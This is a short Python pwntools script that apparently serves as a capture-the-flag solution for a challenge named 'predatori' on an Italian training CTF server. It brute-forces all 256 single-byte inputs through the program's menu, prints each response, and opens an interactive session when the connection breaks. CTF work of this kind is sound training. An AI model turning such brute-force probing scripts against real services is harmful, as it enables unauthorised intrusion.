from pwn import *

elf = context.binary = ELF('./predatori')
context.terminal = ()


context.log_level = "CRITICAL"
if args.REMOTE:
    p = remote('predatori.challs.olicyber.it', 15006)
elif args.GDB:
    p = gdb.debug([elf.path],'''
        b main
        r
        c
        ''')
else:
    p = process()
for i in range(256):
    try:
        p.sendlineafter(b'Esci\n', b'1')
        p.recvline()
        p.send(bytes([i]))
        risp = p.recvuntil(b'1) Leggi', drop=True)
        print(risp)
    except:
        p.interactive()